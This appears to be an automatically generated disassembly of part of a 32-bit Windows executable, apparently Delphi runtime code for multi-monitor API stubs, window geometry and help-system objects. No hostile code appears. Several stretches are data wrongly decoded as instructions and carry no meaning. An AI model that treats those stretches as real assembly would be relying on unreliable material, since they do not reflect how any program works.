mov esi [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
mov eax ebx
and eax 0x3
test al al
je r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x1
call sub_42903c
mov [ rw-data ] eax
push ebx
push esi
call [ rw-data ]
jmp r-xdata
push esi
call IsIconic
test eax eax
je r-xdata
mov eax 0x12340042
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
lea eax [ ebp - 0x10 ]
push eax
push esi
call GetWindowRect
lea eax [ ebp - 0x2c ]
push eax
push esi
call GetWindowPlacement
jmp r-xdata
push ebx
lea eax [ ebp - 0x10 ]
push eax
call sub_4291ac
sub_4292d2
add [ eax ] al
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
mov eax edi
and eax 0x3
test al al
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x3
call sub_42903c
mov [ rw-data ] eax
push edi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov ebx 0x12340042
mov esi [ ebp + 0x8 ]
test esi esi
jl r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
push 0x0
call [ rw-data ]
cmp esi eax
jge r-xdata
cmp [ ebp + 0xc ] 0x0
jl r-xdata
push 0x1
call [ rw-data ]
cmp eax [ ebp + 0xc ]
jle r-xdata
sub_429353
call [ eax ]
add [ eax ] al
add [ ebp + 0x6f ] cl
outsb
imul esi [ edi + ebp * 2 + 0x72 ] 0x6d6f7246
push eax
outsd
imul ebp [ esi + 0x74 ] 0x0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
cmp edi 0x12340042
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x4
call sub_42903c
mov [ rw-data ] eax
push esi
push edi
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
test esi esi
je r-xdata
cmp [ esi ] 0x28
jb r-xdata
push 0x0
lea eax [ ebp - 0x10 ]
push eax
push 0x0
push 0x30
call SystemParametersInfoA
test eax eax
je r-xdata
xor eax eax
mov [ esi + 0x4 ] eax
xor eax eax
mov [ esi + 0x8 ] eax
push 0x0
call [ rw-data ]
mov [ esi + 0xc ] eax
push 0x1
call [ rw-data ]
mov [ esi + 0x10 ] eax
push esi
lea edi [ esi + 0x14 ]
lea esi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov [ esi + 0x24 ] 0x1
cmp [ esi ] 0x4c
jb r-xdata
mov bl 0x1
push r-xdata
lea eax [ esi + 0x28 ]
push eax
call lstrcpyA
sub_429440
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
cmp edi 0x12340042
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x5
call sub_42903c
mov [ rw-data ] eax
push esi
push edi
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
test esi esi
je r-xdata
cmp [ esi ] 0x28
jb r-xdata
push 0x0
lea eax [ ebp - 0x10 ]
push eax
push 0x0
push 0x30
call SystemParametersInfoA
test eax eax
je r-xdata
xor eax eax
mov [ esi + 0x4 ] eax
xor eax eax
mov [ esi + 0x8 ] eax
push 0x0
call [ rw-data ]
mov [ esi + 0xc ] eax
push 0x1
call [ rw-data ]
mov [ esi + 0x10 ] eax
push esi
lea edi [ esi + 0x14 ]
lea esi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov [ esi + 0x24 ] 0x1
cmp [ esi ] 0x4c
jb r-xdata
mov bl 0x1
push r-xdata
lea eax [ esi + 0x28 ]
push eax
call lstrcpyA
sub_429514
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
cmp edi 0x12340042
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x6
call sub_42903c
mov [ rw-data ] eax
push esi
push edi
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
test esi esi
je r-xdata
cmp [ esi ] 0x28
jb r-xdata
push 0x0
lea eax [ ebp - 0x10 ]
push eax
push 0x0
push 0x30
call SystemParametersInfoA
test eax eax
je r-xdata
xor eax eax
mov [ esi + 0x4 ] eax
xor eax eax
mov [ esi + 0x8 ] eax
push 0x0
call [ rw-data ]
mov [ esi + 0xc ] eax
push 0x1
call [ rw-data ]
mov [ esi + 0x10 ] eax
push esi
lea edi [ esi + 0x14 ]
lea esi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov [ esi + 0x24 ] 0x1
cmp [ esi ] 0x4c
jb r-xdata
mov bl 0x1
push r-xdata
lea eax [ esi + 0x28 ]
push eax
call lstrcpyA
sub_4295e8
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
cmp [ ebp + 0x10 ] 0x0
je r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x7
call sub_42903c
mov [ rw-data ] eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
push edi
push esi
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
xor eax eax
mov [ ebp - 0x1c ] eax
xor eax eax
mov [ ebp - 0x18 ] eax
push 0x0
call [ rw-data ]
mov [ ebp - 0x14 ] eax
push 0x1
call [ rw-data ]
mov [ ebp - 0x10 ] eax
test esi esi
je r-xdata
test edi edi
je r-xdata
lea eax [ ebp - 0x2c ]
push eax
push esi
call GetClipBox
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x8 ]
push eax
push esi
call GetDCOrgEx
test eax eax
je r-xdata
mov eax [ ebp + 0x14 ]
push eax
lea eax [ ebp - 0x1c ]
push eax
push esi
push 0x12340042
call [ ebp + 0x10 ]
mov ebx eax
push edi
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x1c ]
push eax
call IntersectRect
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
neg eax
push eax
mov eax [ ebp - 0x8 ]
neg eax
push eax
lea eax [ ebp - 0x1c ]
push eax
call OffsetRect
lea eax [ ebp - 0x2c ]
push eax
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x1c ]
push eax
call IntersectRect
test eax eax
je r-xdata
mov bl 0x1
jmp r-xdata
push edi
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x1c ]
push eax
call IntersectRect
test eax eax
jne r-xdata
test edi edi
je r-xdata
cmp [ ebp - 0xc ] 0x1
jne r-xdata
mov bl 0x1
jmp r-xdata
sub_429783
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_4297a9
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4297b0
retn
sub_4297c4
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4297e9
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4297f0
retn
sub_4297fc
add [ eax + 0xd0f0042 ] bl
dec ecx
dec eax
insb
dec eax
insb
jo r-xdata
insb
arpl [ gs : edi + ebp * 2 + 0x72 ] si
and al 0x11
inc eax
add [ ecx ] al
pop eax
xchg ebx eax
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
adc ecx [ ecx + 0x45 ]
outsb
je r-xdata
push [ eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4297f0
retn
cmp cl [ ecx ]
dec eax
insb
jo r-xdata
inc edx
outsb
dec eax
insb
adc [ ebx + 0x4fc000b9 ] esp
jae r-xdata
outsd
outsb
je r-xdata
cdq
inc edx
add [ eax + eax ] cl
popad
outsb
popad
jb r-xdata
lodsd [ esi ]
jns r-xdata
imul esp [ ebp + 0x77 ] 0x98687265
jb r-xdata
cmp cl [ ecx ]
dec eax
insb
jo r-xdata
add [ edi ] cl
adc [ ecx + 0x43 ] ecx
jne r-xdata
add bh bh
[ eax + ebx * 4 + 0x42 ]
lodsd [ esi ]
imul esp [ ebp + 0x77 ] 0x11247265
inc eax
add [ ecx ] al
xchg ebx eax
cld
cmp cl [ ecx ]
dec eax
insb
jo r-xdata
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] cl
0x42 0x0
add [ ebx + esi + 0x33c00040 ] dh
inc eax
add ah al
xor eax [ eax ]
enter 0x4033 0x0
mov esp 0x4004033
xor [ eax ] eax
and [ ecx ] dh
inc eax
add [ ecx + esi + 0x40 ] bl
add [ eax * 2 + 0x706c6548 ] dl
push ebx
add [ ecx + ebx * 4 + 0x42 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
movsb [ edi ] [ esi ]
adc [ eax ] eax
add [ esi - 0x6d ] esp
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
add [ eax ] al
dec esp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + ebx * 4 + 0xc0042 ] ah
outsb
je r-xdata
test al 0x98
inc edx
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
adc [ eax ] eax
add [ ebx + edx * 4 - 0x4 ] esp
cdq
outsb
je r-xdata
adc eax 0x65705349
arpl [ ecx + 0x61 ] bp
insb
push edi
imul ebp [ esi + 0x48 ] 0x56706c65
je r-xdata
jns r-xdata
add [ edi ] cl
outsb
je r-xdata
dec [ ebx + 0x429838c0 ]
add [ edi ] cl
or ecx [ ecx + 0x48 ]
insb
jo r-xdata
add bh bh
xor [ edx ] ecx
add [ eax ] al
add eax 0xffffffd4
jmp r-xdata
imul esp [ ebp + 0x77 ] 0x6f4e7265
mov eax eax
push esi
je r-xdata
insb
jo r-xdata
cmp cl [ ecx ]
dec eax
insb
jo r-xdata
add [ edx + esi * 2 + 0x40 ] cl
jae r-xdata
jns r-xdata
add al al
dec edi
jae r-xdata
jb r-xdata
cmp cl [ ecx ]
dec eax
insb
jo r-xdata
insd
dec eax
insb
jo r-xdata
jo r-xdata
insb
je r-xdata
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
jae r-xdata
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_42a58f
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
inc edx
add [ eax + eax ] al
insd
inc ebp
js r-xdata
dec ecx
imul esp [ ebp + 0x77 ] 0x98a47265
inc edx
add [ ecx ] al
xchg bx ax
cld
inc eax
add [ ecx + esi ] al
inc eax
add [ eax ] ah
xor [ eax ] eax
pop esp
xor [ eax ] eax
adc al 0x45
dec eax
insb
jo r-xdata
outsb
je r-xdata
add [ edi ] cl
or al 0x49
add bh bh
dec [ ebx + 0x429924c0 ]
cwde
inc edx
add bh bh
jmp esp
dec eax
insb
jo r-xdata
dec ecx
inc edx
add [ ecx ] al
xchg bx ax
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
cwde
insd
and al 0x11
inc eax
add [ ecx ] al
push ebx
xchg ebx eax
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
js r-xdata
movlps [ ecx + 0x45 ] xmm1
add [ edi ] cl
add bh bh
dec [ ebx + 0x4298a8c0 ]
mov eax [ esi + 0x14 ]
mov eax [ eax + 0x8 ]
test eax eax
jne r-xdata
lea eax [ esi + 0x24 ]
mov edx ebx
call sub_403f94
add [ eax ] al
andps xmm1 [ eax + 0x65 ]
insb
jo r-xdata
add al 0x0
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sbb bl [ edx + 0xc0042 ]
add [ eax ] al
mov al 0x10
inc eax
add [ ebx + esi + 0x33c00040 ] dh
inc eax
add ah al
xor eax [ eax ]
enter 0x4033 0x0
mov esp 0x4004033
xor [ eax ] eax
and [ ecx ] dh
inc eax
add [ ecx + esi + 0x40 ] bl
add [ esi ] cl
imul ebp [ edi + 0x6e ] 0x800408d
0x42 0x0
add [ eax ] al
add [ eax ] al
or [ edx + 0x42 ] bl
add [ eax ] al
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax - 0x68 ] ch
inc eax
add [ eax ] ah
xor [ eax ] eax
pop esp
xor [ eax ] eax
push cs
jns r-xdata
jo r-xdata
cmp cl [ ecx ]
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov ecx r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba88
call sub_4038f8
jmp r-xdata
int3
mov eax eax
lea eax [ eax ]
movsb [ edi ] [ esi ]
cdq
inc edx
add [ eax ] al
add [ eax ] al
add bh bh
dec [ ebp - 0x665bffc0 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42a596
lea eax [ ebp - 0x10 ]
mov edx [ r-xdata ]
mov ecx 0x2
call sub_4049c8
lea eax [ ebp - 0x8 ]
call sub_4058d0
retn
inc ebx
xor edi edi
inc edi
dec ebx
jne r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_405914
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
jmp r-xdata
mov edx edi
mov eax [ esi + 0x14 ]
call sub_428df4
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x8 ]
call sub_4058e8
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_405914
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x30 ]
test al al
je r-xdata
sub_429bc0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_429c36
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
jne r-xdata
xor edx edx
mov [ eax ] edx
lea ecx [ ebp - 0x8 ]
mov edx ebx
mov eax [ rw-data ]
call sub_429d4c
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4058e8
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_429c3d
lea eax [ ebp - 0x8 ]
call sub_4058d0
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_429cd8
mov [ rw-data ] eax
sub_429c44
push ebp
mov ebp esp
push ebx
mov ebx eax
test ebx ebx
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
xor eax eax
mov [ ebx ] eax
mov eax ebx
mov edx [ rw-data ]
test edx edx
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_429cd8
mov [ rw-data ] eax
mov ecx r-xdata
call sub_405914
xor eax eax
pop ebx
pop ebp
retn
sub edx 0xfffffff8
sub_429c9c
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
lea eax [ edi + 0x4 ]
mov edx esi
call sub_4058e8
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403490
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4034e8
pop [ fs : 0x0 ]
add esp 0xc
sub_429cd8
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_40313c
mov dl 0x1
mov eax [ r-xdata ]
call sub_428db8
mov [ esi + 0x10 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_428db8
mov [ esi + 0x14 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_428db8
mov [ esi + 0x18 ] eax
lea eax [ esi + 0x24 ]
call sub_403f40
mov [ esi + 0x1c ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403490
mov eax esi
pop esi
pop ebx
retn
call sub_4034e8
pop [ fs : 0x0 ]
add esp 0xc
sub_429d4c
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_429e4d
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx edi
mov dl 0x1
mov eax [ r-xdata ]
call sub_429c9c
mov esi eax
mov eax [ ebx + 0x1c ]
mov [ esi + 0x8 ] eax
mov eax [ ebx + 0x10 ]
mov edx [ eax + 0x8 ]
mov ecx esi
call sub_428e08
mov edx [ esi + 0x8 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x24 ]
lea eax [ ebp - 0x8 ]
call sub_4058d0
mov ecx eax
mov edx r-xdata
mov eax edi
call sub_40d3bc
test al al
je r-xdata
lea eax [ ebp - 0xc ]
call sub_4058d0
mov ecx eax
mov edx r-xdata
mov eax edi
call sub_40d3bc
test al al
je r-xdata
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_429c9c
mov esi eax
mov eax [ ebx + 0x1c ]
mov [ esi + 0x8 ] eax
mov eax [ ebx + 0x14 ]
mov edx [ eax + 0x8 ]
mov ecx esi
call sub_428e08
inc [ ebx + 0x1c ]
mov eax [ ebp - 0x4 ]
mov edx ebx
test edx edx
je r-xdata
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_429c9c
mov esi eax
mov eax [ ebx + 0x1c ]
mov [ esi + 0x8 ] eax
mov eax [ ebx + 0x18 ]
mov edx [ eax + 0x8 ]
mov ecx esi
call sub_428e08
mov ecx r-xdata
call sub_405914
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_429e54
lea eax [ ebp - 0xc ]
call sub_4058d0
lea eax [ ebp - 0x8 ]
call sub_4058d0
retn
sub edx 0xfffffff8
sub_429e6c
push ebx
push esi
push edi
mov ebx eax
jmp r-xdata
mov esi [ ebx + 0x10 ]
mov edi [ esi + 0x8 ]
test edi edi
jg r-xdata
mov edx edi
dec edx
mov eax esi
call sub_428df4
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov eax [ ebx + 0x10 ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebx + 0x14 ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebx + 0x18 ]
mov edx [ eax ]
call [ edx + 0x8 ]
pop edi
pop esi
pop ebx
retn
sub_429eac
push ebx
push esi
push edi
mov edi eax
mov eax [ edi + 0x10 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov eax [ edi + 0x10 ]
mov edx esi
call sub_428df4
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x28 ]
inc esi
dec ebx
jne r-xdata
sub_429edc
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
xor edx edx
mov [ ebp - 0x10 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_42a06e
push [ fs : eax ]
mov [ fs : eax ] esp
mov esi [ ebx + 0x10 ]
cmp [ esi + 0x8 ] 0x1
jne r-xdata
cmp [ ebx + 0xc ] 0x0
je r-xdata
mov eax esi
xor edx edx
call sub_428df4
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
test al al
je r-xdata
mov esi [ ebx + 0x10 ]
cmp [ esi + 0x8 ] 0x0
jle r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40313c
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_42a009
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x10 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42a075
lea eax [ ebp - 0x10 ]
call sub_403f40
retn
mov eax [ ebx + 0x10 ]
xor edx edx
call sub_428df4
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x1c ]
jmp r-xdata
mov ecx r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba88
call sub_4038f8
mov eax esi
xor edx edx
call sub_428df4
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
jle r-xdata
inc eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x0
mov eax [ ebx + 0x10 ]
xor edx edx
call sub_428df4
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x1c ]
jmp r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x1c ]
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x90 ]
mov eax [ ebx + 0xc ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x1c ]
jmp r-xdata
inc [ ebp - 0x8 ]
dec [ ebp - 0xc ]
jne r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ esi + 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
mov edx [ ebp - 0x10 ]
mov ecx esi
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0x3c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_40316c
retn
mov eax [ ebx + 0x10 ]
mov edx [ ebp - 0x8 ]
call sub_428df4
mov esi eax
mov eax [ esi + 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
test al al
je r-xdata
sub_42a07c
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
push ebp
push sub_42a161
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
test esi esi
je r-xdata
mov eax [ edi + 0x18 ]
mov eax [ eax + 0x8 ]
test eax eax
jle r-xdata
lea eax [ edi + 0x24 ]
mov edx esi
call sub_403f94
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42a168
lea eax [ ebp - 0x10 ]
mov edx [ r-xdata ]
mov ecx 0x2
call sub_4049c8
lea eax [ ebp - 0x8 ]
call sub_4058d0
retn
dec eax
jne r-xdata
xor edx edx
mov eax [ edi + 0x18 ]
call sub_428df4
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x8 ]
call sub_4058e8
mov ax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_405914
mov eax [ ebp - 0x10 ]
mov ecx esi
mov edx [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x40 ]
mov ebx eax
xor edx edx
mov eax [ edi + 0x18 ]
call sub_428df4
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x8 ]
call sub_4058e8
mov ax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_405914
mov eax [ ebp - 0xc ]
mov ecx esi
mov edx [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x40 ]
mov ebx eax
jmp r-xdata
sub_42a398
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_42a48b
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ esi + 0x14 ]
mov eax [ eax + 0x8 ]
test eax eax
jne r-xdata
lea eax [ esi + 0x24 ]
mov edx [ ebp - 0x8 ]
call sub_403f94
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov ecx r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba88
call sub_4038f8
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42a492
lea eax [ ebp - 0x18 ]
mov edx [ r-xdata ]
mov ecx 0x2
call sub_4049c8
lea eax [ ebp - 0x10 ]
call sub_4058d0
retn
inc ebx
mov [ ebp - 0xc ] 0x0
inc [ ebp - 0xc ]
dec ebx
jne r-xdata
lea eax [ ebp - 0x18 ]
mov edx [ ebp - 0x10 ]
mov ecx r-xdata
call sub_405914
mov eax [ ebp - 0x18 ]
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x3c ]
jmp r-xdata
mov edx [ ebp - 0xc ]
mov eax [ esi + 0x14 ]
call sub_428df4
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x10 ]
call sub_4058e8
lea eax [ ebp - 0x14 ]
mov edx [ ebp - 0x10 ]
mov ecx r-xdata
call sub_405914
mov eax [ ebp - 0x14 ]
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0x38 ]
test al al
je r-xdata
sub_42a4b0
inc ebx
mov eax eax
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_42a58f
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
mov eax [ esi + 0x14 ]
mov eax [ eax + 0x8 ]
test eax eax
jne r-xdata
lea eax [ esi + 0x24 ]
mov edx ebx
call sub_403f94
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov ecx r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba88
call sub_4038f8
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42a596
lea eax [ ebp - 0x10 ]
mov edx [ r-xdata ]
mov ecx 0x2
call sub_4049c8
lea eax [ ebp - 0x8 ]
call sub_4058d0
retn
inc ebx
xor edi edi
inc edi
dec ebx
jne r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_405914
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
jmp r-xdata
mov edx edi
mov eax [ esi + 0x14 ]
call sub_428df4
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x8 ]
call sub_4058e8
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_405914
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x30 ]
test al al
je r-xdata
sub_42a60c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0xc ]
mov eax [ ebp - 0x4 ]
call sub_4043f0
xor eax eax
push ebp
push sub_42a6a1
push [ fs : eax ]
